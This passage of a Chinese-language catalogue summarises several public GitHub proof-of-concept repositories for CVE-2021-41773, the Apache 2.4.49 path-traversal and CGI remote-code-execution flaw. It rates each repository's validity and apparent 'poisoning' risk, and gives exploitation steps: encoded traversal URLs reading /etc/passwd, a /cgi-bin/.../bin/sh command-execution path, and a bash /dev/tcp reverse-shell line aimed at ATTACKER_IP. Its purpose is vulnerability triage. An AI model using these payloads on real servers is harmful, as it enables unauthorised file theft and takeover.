CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于对路径规范化处理的更改存在缺陷导致。攻击者可以利用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，则请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且已被广泛利用。提供的 Dockerfile 和 README.md 文件提供了一个可行的漏洞利用方式。

**利用方式：**
1.  **路径遍历：** 攻击者可以通过构造包含 `..` 或 URL 编码的 `..%2f` 的恶意 URL，绕过服务器的路径检查，访问受限文件。
2.  **CGI 执行：** 如果目标服务器启用了 CGI 脚本执行，攻击者可以通过路径遍历访问 CGI 脚本，并执行任意代码。

**POC 代码分析：**

*   **Dockerfile:** 该 Dockerfile 用于构建一个存在 CVE-2021-41773 漏洞的 Apache HTTP Server 2.4.49 环境。
    *   `FROM httpd:2.4.49`：指定使用 Apache HTTP Server 2.4.49 镜像作为基础镜像。
    *   `RUN sed -i 's/#LoadModule cgi_module/LoadModule cgi_module/' /usr/local/apache2/conf/httpd.conf`：启用 CGI 模块。
    *   `RUN echo ...`：配置 CGI 目录，允许执行 CGI 脚本。
    *   `RUN echo "AllowEncodedSlashes On" >> /usr/local/apache2/conf/httpd.conf`：允许 URL 中包含编码的斜杠，这是利用该漏洞的关键。
    *   `COPY test.cgi /usr/local/apache2/cgi-bin/test.cgi`：复制一个测试 CGI 脚本到 CGI 目录下。
    *   `RUN chmod +x /usr/local/apache2/cgi-bin/test.cgi`：为测试 CGI 脚本添加执行权限。
*   **README.md:** 该文件描述了 CVE-2021-41773 漏洞的细节，以及如何使用 Nmap NSE 脚本检测该漏洞。提供了 Nmap 脚本的架构、payload 设置、HTTP 请求和响应处理、输出格式和错误处理。

**投毒风险：**
提供的 Dockerfile 主要用于搭建漏洞环境以进行验证，风险极低。它本身没有包含恶意代码。
虽然 *test.cgi* 文件内容未知，这里假设 *test.cgi* 为安全的代码，否则投毒的概率会升高。
综合评估投毒风险为 1%。


**项目地址:** [charanvoonna/CVE-2021-41773](https://github.com/charanvoonna/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #25

**来源**: [CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md](../2021/CVE-2021-41773-dileepdkumar_LayarKacaSiber-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution (RCE)

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件或执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。该漏洞源于对路径规范化的更改，使得攻击者可以使用路径遍历攻击将URL映射到Alias-like指令配置的目录之外的文件。如果这些目录之外的文件没有受到默认配置"require all denied"的保护，请求可能会成功。如果CGI脚本对这些别名路径启用，则可能导致远程代码执行。

**利用方式：**
攻击者可以构造包含编码后的路径遍历字符（例如`.%2e`）的HTTP请求，绕过服务器的安全检查，访问服务器文件系统上的任意文件。如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意脚本并执行来实现远程代码执行。

**有效性：**
提供的PoC代码`exploit.sh`看起来是有效的。它使用`curl`命令发送包含路径遍历序列的请求，并尝试执行指定的命令。Dockerfile和httpd-path-traversal.conf文件配置了一个易受攻击的Apache服务器环境，用于测试路径遍历。

**投毒风险：**
检查提供的文件，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/README.md`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/exploit.sh`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/Dockerfile`，`/tmp/59e48ccb9412bd5b9a153d1926dd8eca/Path Traversal/httpd-path-traversal.conf`。这些文件看起来主要用于演示和利用CVE-2021-41773漏洞。其中，`exploit.sh`脚本存在一定的风险，攻击者可以利用此脚本执行恶意命令。`httpd-path-traversal.conf` 配置，如果被攻击者修改，会导致服务器存在后门，但是从目前的代码来看，投毒风险较低。只有 `exploit.sh`存在可被利用的风险，但这不是作者主动投毒，所以投毒风险很低。

**项目地址:** [dileepdkumar/LayarKacaSiber-CVE-2021-41773](https://github.com/dileepdkumar/LayarKacaSiber-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #26

**来源**: [CVE-2021-41773-gunzf0x_CVE-2021-41773.md](../2021/CVE-2021-41773-gunzf0x_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并启用了cgi-bin目录的执行权限

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。攻击者可以通过构造包含特殊编码的 URL，利用路径遍历漏洞访问受限目录之外的文件。如果服务器配置允许 CGI 脚本执行，则可以进一步利用该漏洞执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的 PoC 代码，此漏洞利用是有效的。漏洞库中提到该漏洞已在野外被利用，多个搜索结果也证实了该漏洞的存在和潜在危害，并提供了利用示例。PoC 代码实现了利用路径遍历漏洞执行命令的功能。

**投毒风险：**
PoC 代码主要功能是利用漏洞实现远程命令执行。以下是对代码可能存在的投毒风险的分析：

*   **代码结构和功能：** PoC 代码结构清晰，主要包括参数解析、URL 构造和 HTTP 请求发送等功能。这些功能都与漏洞利用直接相关。
*   **潜在的风险点：**  PoC 代码中存在一些潜在的风险点：
    *   `data_payload: str = f"echo Content-Type: text/plain; echo; {args.command}"` ，args.command参数如果被恶意构造，可能会导致执行非预期的系统命令。
        *   虽然`clean_url`函数旨在清理URL，但可能存在绕过的风险。

总体来说，代码的投毒风险较低，大概在5%。主要风险集中在命令执行的参数上，以及URL清洗函数可能存在的绕过。

**利用方式：**
1.  **确定目标：** 找到运行 Apache HTTP Server 2.4.49 的目标服务器，并确认 `cgi-bin` 目录已启用。
2.  **构造 Payload：** 使用包含路径遍历的 URL 和要执行的命令构造 HTTP POST 请求。URL 的基本格式如下：
    ```
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
    ```
    其中，`.%2e` 是 `..` 的 URL 编码，用于绕过路径检查。`bin/sh` 是要执行的 shell 程序的路径。
3.  **发送请求：**  将构造好的 HTTP POST 请求发送到目标服务器。
4.  **获取结果：**  如果漏洞利用成功，服务器将执行指定的命令，并将结果作为 HTTP 响应返回。

**项目地址:** [gunzf0x/CVE-2021-41773](https://github.com/gunzf0x/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #27

**来源**: [CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md](../2021/CVE-2021-41773-hackedrishi_CTF_WRITEUPS-TryHackMe-CVE-2021-41773-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当或CGI脚本启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径穿越漏洞。攻击者可以通过构造包含`..`的恶意URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了CGI脚本，攻击者可能进一步利用该漏洞执行远程代码。根据漏洞描述，需要特定的配置错误，例如，文件没有被"require all denied"保护。从提供的漏洞利用代码看， 该代码本身是一个 CTF 的 Writeup， 解释了漏洞原理和利用方式，本身不包含恶意代码，但可能存在作者隐藏的后门代码的风险，但是可能性极低。

**有效性：**
该漏洞利用代码(CTF Writeup) 本身不直接用于漏洞利用，而是用于解释该漏洞，根据搜索引擎结果，该漏洞真实存在且被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个CTF Writeup，主要用于讲解漏洞原理，本身不太可能包含恶意投毒代码， 但为了安全起见， 风险评估为5%。

**利用方式：**
1.  **路径穿越：** 构造包含`..`的URL，例如`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试访问服务器上的敏感文件，如`/etc/passwd`。
2.  **RCE（如果CGI启用）：**如果服务器配置允许执行CGI脚本，攻击者可以通过上传恶意CGI脚本并执行它，来实现远程代码执行。 需要注意的是，通常需要结合Alias指令的配置不当才能实现。

**利用前提：**
*   Apache HTTP Server版本为2.4.49。
*   目标文件所在目录没有被`require all denied`限制。
*   （可选）服务器启用了CGI脚本，并且Alias指令配置不当。

**项目地址:** [hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-](https://github.com/hackedrishi/CTF_WRITEUPS-TryHackMe-CVE-2021-41773-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #28

**来源**: [CVE-2021-41773-javaamo_CVE-2021-41773.md](../2021/CVE-2021-41773-javaamo_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的Apache HTTP Server 2.4.49版本，并启用了cgi-bin目录，且该目录下的文件没有被'require all denied'保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2021-41773 漏洞是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞。攻击者可以通过构造包含特殊字符的 URL，绕过 Alias 类似的指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时启用了 CGI 脚本支持，攻击者甚至可以执行任意代码。

**有效性：**
根据漏洞描述和提供的漏洞利用代码，该漏洞利用是有效的。搜索引擎结果也表明该漏洞已被公开利用。

**投毒风险：**
提供的漏洞利用代码主要由一个shell脚本和一个README文件组成。shell脚本的功能是向目标服务器发送包含恶意路径的HTTP请求，读取指定文件或执行命令。README文件是对漏洞利用代码的说明。
脚本本身存在投毒的可能性较低，风险预估1%。主要风险点在于targets.txt文件，如果攻击者替换了targets.txt中的目标，可能会导致非授权的扫描或者攻击。需要注意的是，该PoC本身就是用于攻击的，因此不能将利用漏洞的代码判定为投毒。

**利用方式：**
1.  准备：准备一个包含目标服务器地址列表的 `targets.txt` 文件。
2.  路径遍历：使用`./50383.sh targets.txt /etc/passwd`尝试读取敏感文件，例如`/etc/passwd`。
3.  远程代码执行：如果目标服务器启用了 CGI，则可以通过类似`./50383.sh targets.txt /bin/sh whoami`的方式执行命令。
   需要注意的是，该POC代码尝试利用路径遍历漏洞，将请求发送到`/cgi-bin/`目录，从而触发CGI脚本的执行，最终达到远程代码执行的目的. 如果CGI未开启，则只能进行文件读取。

**项目地址:** [javaamo/CVE-2021-41773](https://github.com/javaamo/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #29

**来源**: [CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md](../2021/CVE-2021-41773-jkska23_Additive-Vulnerability-Analysis-CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历和文件泄露

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置存在缺陷，允许访问受限目录外的文件，并且可能开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

**有效性分析：**

根据漏洞库信息和搜索引擎结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中存在的路径遍历漏洞，且已被公开利用。搜索引擎结果显示该漏洞允许未经验证的攻击者访问敏感信息，甚至执行任意代码。漏洞库信息也证实了这一点，并指出该漏洞允许攻击者绕过 Alias 指令配置的目录限制，访问未受 "require all denied" 保护的文件。如果目标配置允许，还可能执行 CGI 脚本。

**投毒风险分析：**

提供的“漏洞利用代码”实际上包含两个文件：README.md 和 index.html。

*   **README.md：**  只是一个简单的文本文件，描述了该漏洞和远程代码执行。
*   **index.html：** 是由 pdf2htmlEX 生成的 HTML 文件，用于显示 PDF 内容。这个HTML 文件看起来是正常的，没有任何明显的恶意代码，它的作用仅仅是将PDF转换成了HTML，并没有什么可疑的js或者链接。

因此，提供的代码仓库中**没有**发现任何明显的投毒代码。 投毒风险极低，几乎为0%的可能性

**利用方式：**

利用 CVE-2021-41773 的基本方式是通过构造包含路径遍历字符（如`..%2f`）的 URL 来访问目标服务器上的任意文件。攻击者可以尝试以下步骤：

1.  **确定目标服务器是否运行 Apache HTTP Server 2.4.49。**
2.  **尝试使用路径遍历payload访问敏感文件，例如`/../../../../etc/passwd`。** 使用URL编码来绕过一些常见的安全过滤。
3.  **如果服务器配置允许，尝试执行任意 CGI 脚本。**  这通常涉及到上传恶意脚本并使用路径遍历漏洞来访问和执行它。

**漏洞利用的关键点：**

*   **Alias配置：**  该漏洞依赖于 Apache HTTP Server 的 Alias 指令配置不当。
*   **权限控制：**  被访问的文件必须没有受到 "require all denied" 的保护。
*   **CGI支持：**  如果开启了 CGI 支持，则可能导致远程代码执行。

**项目地址:** [jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773](https://github.com/jkska23/Additive-Vulnerability-Analysis-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #30

**来源**: [CVE-2021-41773-justakazh_mass_cve-2021-41773.md](../2021/CVE-2021-41773-justakazh_mass_cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和/或执行远程代码

**影响版本:** 2.4.49

**利用条件:** 目标系统运行受影响的 Apache HTTP Server 版本，并配置了Alias指令或启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。该漏洞允许攻击者通过构造包含特殊字符（如 URL 编码的 `%2e` 和 `%2e%2e`）的 URL，来访问服务器上受限目录之外的文件。

**有效性:**

根据漏洞库信息，该漏洞已在野外被利用。提供的 exploit-db 链接 (在 `mass_cve-2021-41773/README.md` 中) 也验证了这一点。提供的python脚本 `cve-2021-41773.py`  通过读取 `/etc/passwd` 文件来检测漏洞存在。另一个脚本 `cve-2021-41773_RCE.py` 尝试通过 cgi-bin 执行命令 `uname`，如果返回 `Linux` 或 `linux`，则认为存在 RCE 漏洞。

**投毒风险:**

检查提供的代码，没有发现明显的恶意或后门代码。所有的脚本都是为了验证漏洞的存在，而不是植入任何持久性的后门。`cve-2021-41773.py`  扫描目标然后保存结果, `cve-2021-41773_RCE.py`  是RCE验证脚本。`cve-2021-41773_manual.py` 允许手动指定命令执行. 因此投毒风险评估为0%。

**利用方式:**

1.  **路径遍历 (文件读取):**  攻击者发送一个精心构造的 HTTP GET 请求，其中包含经过 URL 编码的路径遍历字符，例如 `/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`。如果服务器存在漏洞且目录配置不当，服务器将返回 `/etc/passwd` 的内容。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI 脚本执行，攻击者可以使用路径遍历来访问和执行任意脚本。`cve-2021-41773_RCE.py` 脚本通过POST请求向URL发送命令, 例如 `uname`，如果执行成功, 则判定可以RCE.  利用需要服务器配置支持 CGI 脚本，且目标路径没有 require all denied 配置。

**项目地址:** [justakazh/mass_cve-2021-41773](https://github.com/justakazh/mass_cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #31

**来源**: [CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md](../2021/CVE-2021-41773-khaidtraivch_CVE-2021-41773-Apache-2.4.49-.md)

## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #32

**来源**: [CVE-2021-41773-luongchivi_CVE-2021-41773.md](../2021/CVE-2021-41773-luongchivi_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露和远程代码执行 (Remote Code Execution, RCE)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias指令配置不当，未对外部文件目录进行访问限制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的路径遍历漏洞。攻击者可以通过构造包含`/.%2e`或`/%2e%2e`等特殊序列的URL，绕过服务器的路径规范化检查，从而访问Alias指令配置之外的文件。

**有效性：**
提供的Dockerfile和docker-compose.yml文件用于搭建存在CVE-2021-41773漏洞的Apache HTTP Server 2.4.49环境。README.md中提供了利用该漏洞读取`/etc/passwd`文件的POC，验证了漏洞的有效性。搜索引擎结果也表明该漏洞可以被利用来进行路径遍历和远程代码执行。

**投毒风险：**
Dockerfile仅仅是从官方镜像拉取存在漏洞的镜像并复制httpd.conf，httpd.conf是基本的apache配置，没有恶意代码。docker-compose文件只是启动docker。
文件分析结果如下：
*   **Dockerfile:**  该文件用于构建包含漏洞版本的Apache镜像，没有发现恶意行为。
*   **README.md:**  该文件提供了漏洞的POC，用于验证漏洞，其中包含的命令用于读取`/etc/passwd`等文件，属于漏洞利用行为，而非投毒。
*   **docker-compose.yml:**  该文件用于配置和启动Docker容器，没有发现恶意行为。
*   **httpd.conf:**  配置文件为apache的默认配置, 没有恶意行为
虽然没发现明显的恶意代码，但如果使用者不了解漏洞原理，直接部署该环境，可能会造成安全风险。因此，存在极低的投毒风险，约5%。

**利用方式：**
1.  攻击者构造恶意的URL，其中包含`/.%2e`或`/%2e%2e`等序列，用于绕过路径规范化检查。
2.  URL指向`/cgi-bin/`目录下的文件，并利用路径遍历访问目标文件，例如`/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  如果服务器配置允许执行CGI脚本，攻击者甚至可以利用该漏洞执行任意代码，例如通过POST请求传递恶意代码到目标文件。

**修复建议：**
1.  升级到Apache HTTP Server 2.4.50或更高版本。
2.  在Apache配置文件中，对根目录`/`设置`Require all denied`，防止未授权访问。

**项目地址:** [luongchivi/CVE-2021-41773](https://github.com/luongchivi/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #33

**来源**: [CVE-2021-41773-mah4nzfr_CVE-2021-41773.md](../2021/CVE-2021-41773-mah4nzfr_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且启用了 cgi-bin 目录，Alias配置不当，存在文件系统权限问题。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化处理的缺陷导致的路径遍历漏洞，攻击者可以利用该漏洞访问服务器上受限目录之外的文件。如果服务器的 Alias 配置不当，并且文件系统权限设置不合理，攻击者甚至可以通过上传恶意 CGI 脚本来实现远程代码执行。

**有效性：**
提供的 POC 代码看起来是有效的。它利用了路径遍历漏洞，尝试访问 `/bin/sh` 可执行文件，并通过 POST 请求传递包含反向 shell 命令的 DATA。`--path-as-is` 选项确保 curl 不会对 URL 进行规范化，从而允许路径遍历。

**投毒风险：**
漏洞利用代码本身看起来比较直接，目的是触发一个反向shell。`LICENSE`文件正常。
检查以下内容：
1.  **代码混淆：** 代码没有被混淆。
2.  **隐藏命令：** 没有发现隐藏或混淆的命令。
3.  **依赖项：**  该脚本不依赖于任何外部文件或库。
4.  **作者信誉：**  作者的github需要进一步评估，但目前从代码本身看不出明显的恶意。
综合评估，存在投毒代码的可能性较低，估计为 10%。风险主要在于如果攻击成功，攻击者能够在目标系统上执行任意命令，这本身就构成了极大的安全风险。

**利用方式：**
1.  **路径遍历：**  利用 `/.%2e/%2e%2e/` 序列绕过 Apache 的路径访问限制。
2.  **CGI 执行：**  如果 `cgi-bin` 目录已启用，攻击者可以将请求指向该目录。
3.  **反向 Shell：**  通过 POST 请求，攻击者传递一个包含反向 shell 命令的字符串，该命令会在服务器上执行，从而使攻击者获得对服务器的远程访问权限。
4. **payload构造:** 首先构造畸形的URL, 包含`/.%2e/%2e%2e/` 序列, 并指定到系统程序`/bin/sh`, 通过`POST`方法,将需要执行的代码注入到`DATA`变量中.

**总结：**
CVE-2021-41773 是一个严重的安全漏洞，可以被利用进行路径遍历和远程代码执行。提供的 POC 代码可以有效利用此漏洞，但是务必在授权的情况下进行测试。代码本身投毒风险较低，但成功利用漏洞后的风险极高。

**项目地址:** [mah4nzfr/CVE-2021-41773](https://github.com/mah4nzfr/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #34

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-PoC.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致文件泄露，甚至远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录未启用 "require all denied" 保护，CGI脚本需要启用。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符的URL，绕过Alias指令的限制，访问服务器上未授权的文件。如果目标服务器同时启用了CGI脚本支持，则攻击者可能进一步利用此漏洞执行任意代码。

**有效性：**

根据漏洞库信息、搜索结果和漏洞利用代码，可以判断该漏洞的POC代码是有效的。漏洞库中明确指出此漏洞已被在野利用。搜索引擎结果也显示了POC的存在和利用方式。

**投毒风险：**

提供的Dockerfile中，核心操作是：

1.  `FROM httpd:2.4.49`:  指定基础镜像为httpd:2.4.49，这是一个官方镜像，降低了投毒的可能性。
2.  `RUN sed -i 's/Require all denied/# Require all denied/g' /usr/local/apache2/conf/httpd.conf`:  这行代码将httpd.conf文件中的`Require all denied`注释掉。这正是为了使漏洞更容易被利用。如果没有这一行，即使存在路径遍历，也无法读取到未授权的文件（因为默认是拒绝所有访问）。这部分不是投毒，而是为了方便漏洞验证。
其他文件是`LICENSE`，仅包含Apache License 2.0的文本，不涉及任何恶意代码。

因此，直接的恶意投毒代码的可能性较低，但该Dockerfile的意图是创造一个存在漏洞的环境，以便更容易地利用漏洞。该仓库本身并没有主动植入恶意代码，而是提供了一个方便利用漏洞的环境。考虑到该行为可能被恶意利用，判定存在10%的投毒风险，因为此Dockerfile的目的是为了移除安全防护，为攻击者降低利用门槛。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`..%2f`的URL，尝试访问受限目录之外的文件。`%2f`是`/`的URL编码，`..`表示上一级目录。多次使用`..%2f`可以突破目录限制。
2.  **文件读取：** 如果成功绕过限制，攻击者可以读取服务器上的任意文件，例如配置文件、源代码等。
3.  **远程代码执行 (RCE)：** 如果目标服务器启用了CGI，攻击者可以通过上传恶意CGI脚本并执行，实现远程代码执行。利用路径遍历，将请求发送到位于服务器文件系统上的CGI脚本，从而执行任意命令。

例如，攻击者可以使用如下URL读取`/etc/passwd`文件：

`http://target/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd`

如果启用了CGI，攻击者可以尝试利用路径遍历访问并执行CGI脚本，例如：

`http://target/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fpath/to/malicious.cgi`

**项目地址:** [mightysai1997/CVE-2021-41773-PoC](https://github.com/mightysai1997/CVE-2021-41773-PoC)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #35

**来源**: [CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md](../2021/CVE-2021-41773-mightysai1997_CVE-2021-41773-i-.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可导致敏感信息泄露或远程代码执行 (取决于配置)

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行 Apache HTTP Server 2.4.49，且 Alias 指令配置不当或 CGI 脚本启用。需要可以发送 HTTP 请求的网络访问。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在路径规范化方面存在缺陷，攻击者可以利用该漏洞将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 "require all denied" 等默认配置的保护，请求就可以成功。如果为这些 Aliased 路径启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

攻击者通过构造包含特殊编码（如 `%2e`）的路径的 HTTP 请求，绕过 Apache HTTP Server 的路径检查，从而访问受限目录之外的文件。例如，`GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1` 这样的请求可以尝试读取服务器上的 `/etc/passwd` 文件。

根据提供的 Dockerfile 和 README.md，PoC 的有效性依赖于两个关键步骤：

1.  **Dockerfile:** 使用 `httpd:2.4.49` 镜像，确保存在漏洞的 Apache 版本。
